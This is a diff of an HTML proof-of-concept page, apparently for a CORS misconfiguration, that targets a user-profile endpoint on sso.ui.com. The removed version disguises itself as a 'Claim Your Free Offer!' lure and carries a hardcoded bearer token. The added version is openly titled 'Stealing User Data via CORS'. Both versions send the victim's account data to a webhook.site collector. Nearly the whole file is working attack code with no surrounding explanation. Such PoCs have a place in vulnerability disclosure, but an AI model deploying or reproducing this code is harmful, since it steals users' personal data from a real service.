@@ -1,33 +1,26 @@
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Claim Your Free Offer!</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
-  <h1>Claim Your Free Offer!</h1>
-
-  <script>
-    var authToken = "fjIwMjIwNjA3fDFzQktRbURoSEN5dkgyTmZYQUlGdjlWUnBqbUNqalczN2tyVHFHZlZJbGUvajlMQUw2M3prQjF0V2xMM0NYSS9qSkFMQWE1ZmhyRE5qQXN6R096L2NtTG9SNG1jRWN5aUtKSmJ5MTllQ0NNRml3bjNvdFJrdHBGRDR5YkZEclVxZ2l4MEdMbFRudVdnTGtVajYwTWpGODBWNVN2T0lLWldaaXlLMXdraytVMThaeGs2OE5Xb0luYnZBRmpnN05JcGpnVGpSZnlRN0srSnMveWdVeDA3cXhIT3dnUTdkOWgwVW1hY0RyK0l3U0VoSHVSeXlTOWZPcU55cklFMHlBaHVvNHpVUnJxTEdXallJZTVRUkx5UkZ0d1lwemRSaVJxbDB1TDNjdW1WT3dqRXFHNlgwUlhIMnQ4cmFjTTZyZXRHaHI3WjlCcDR8K0pSZTFQcHQ3SVREb2N5dkJtYmtZQ2NuQUUwPXx2VGN5ZGtoa0JhZ3BaMmN0Wk1VK2Z3PT18RVdoNkl4cTVVSmd5aUE1MUh2UlUwdTVqVkgwPQ=="; // Manually add token
-
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('GET', 'https://sso.ui.com/api/sso/v1/user/self', true);
-    req.setRequestHeader("Authorization", "Bearer " + authToken); // Inject token
-    req.withCredentials = true; // Send cookies too
-    req.send();
-
-    function reqListener() {
-      // Exfiltrate response data to attacker's server
-      fetch('https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717', {
-        method: 'POST',
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          response: this.responseText
+    <h1>Stealing User Data via CORS</h1>
+    <script>
+        fetch("https://sso.ui.com/api/sso/v1/user/self", {
+            method: "GET",
+            credentials: "include"
         })
-      });
-    }
-  </script>
-
+        .then(response => response.json())
+        .then(data => {
+            console.log("Stolen Data:", data);
+            // Send the stolen data to an attacker's server
+            fetch("https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717", {
+                method: "POST",
+                body: JSON.stringify(data),
+                headers: { "Content-Type": "application/json" }
+            });
+        })
+        .catch(error => console.error("Exploit failed:", error));
+    </script>
 </body>
 </html>
